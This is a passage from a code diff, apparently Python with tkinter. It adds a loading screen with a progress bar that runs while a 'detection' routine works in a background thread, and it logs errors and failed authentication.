+                logger.error(f"Failed to start detection: {e}")
+            finally:
+                # Close loading screen after detection finishes
+                loading_root.quit()
+
+        # Create a progress bar for loading animation
+        progress = ttk.Progressbar(loading_root, orient="horizontal", length=200, mode="determinate")
+        progress.pack(expand=True, fill='x', padx=20, pady=10)
+        progress.start(45)  # speed of the loading bar animation
+
+        # Start detection in a separate thread
+        detection_thread = threading.Thread(target=start_detection)
+        detection_thread.start()
+
+        # Start loading screen mainloop (blocks here until loading_root.quit() is called)
+        loading_root.mainloop()
+
+    else:
+        logger.info("Authentication cancelled or failed")
